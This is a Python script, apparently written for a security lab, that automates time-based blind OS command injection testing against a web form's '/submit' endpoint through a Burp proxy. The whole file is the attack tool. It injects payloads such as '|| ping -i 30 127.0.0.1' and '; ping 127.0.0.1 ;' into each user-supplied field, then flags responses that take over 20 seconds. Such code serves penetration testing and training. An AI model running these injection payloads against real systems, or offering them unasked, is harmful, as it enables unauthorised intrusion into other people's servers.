import requests
import urllib3
import sys
import time
from bs4 import BeautifulSoup

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cmd_inj(url):
    cmd_tests = [
        '|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &',
        '| ping -i 30 127.0.0.1 |',
        '& ping -i 30 127.0.0.1 &',
        '& ping -n 30 127.0.0.1 &',
        '; ping 127.0.0.1 ;',
        '%0a ping -i 30 127.0.0.1 %0a',
        "' ping 127.0.0.1"
    ]

    s = requests.Session()
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']

    data = dict()
    keys = int(input('Number of data parameters? '))
    for i in range(0,keys):
        pair = input("Enter key:value - ")
        temp = pair.split(':')
        data[temp[0]] = temp[1]
    print(data)
    data['csrf']=csrf
    print(data)

    for cmd in cmd_tests:        
        #data = {
         #  'csrf':csrf,
         #  'name':'asdf',
         #  'email':'asdf@example.com',
         #  'subject':'asdf',
         #  'message':'asdf'
        #}
        
        for k in data:
            if k != 'csrf':
                data[k] = data[k] + cmd
            #print(data[k])
            t_0 = time.time()
            r_1 = s.post(url=url+'/submit', proxies=proxies, verify=False, data=data)
            t_1 = time.time() - t_0
            if t_1 > 20:
                print(f"Possible vulnerability in {k} for {cmd}")
                print(f"Returned {r_1.status_code}")
            data[k] = data[k].replace(cmd,'')
            #print(data)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com/feedback ")
        sys.exit(-1)
    
    print('[-] Attempting simple command injection')
    exploit = cmd_inj(url)
    #print(exploit)